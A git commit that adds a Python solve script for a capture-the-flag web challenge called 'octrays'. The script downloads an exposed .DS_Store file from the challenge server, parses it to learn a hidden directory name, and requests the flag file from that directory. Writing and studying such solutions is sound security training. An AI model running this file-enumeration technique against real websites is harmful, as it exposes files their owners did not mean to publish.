c828550001ccc3bbbd968f43a463f4b2e1520121
Platy <daryl.limkz@gmail.com>
2024-09-29 09:50:14 +0800

    feat(web): updated solve script
    Signed-off-by: Platy <daryl.limkz@gmail.com>

---
+++ Web/octrays/solution/solve.py
@@ -0,0 +1,23 @@
+#!/usr/bin/env python3
+
+from ds_store import DSStore
+import requests
+
+HOST = "cyberblitz-octrays.chals.io"
+PORT = 443
+
+r = requests.get(f"https://{HOST}:{PORT}/.DS_Store", stream=True)
+
+with open("DS_Store", 'wb') as f:
+    for chunk in r.iter_content(chunk_size=1024):
+        if chunk:
+            _ = f.write(chunk)
+
+with DSStore.open("DS_Store") as ds:
+    for entry in ds:
+        filename = entry.filename
+        break
+
+r = requests.get(f"https://{HOST}:{PORT}/{filename}/flag.txt")
+
+print(f"Flag: {r.text.strip()}")
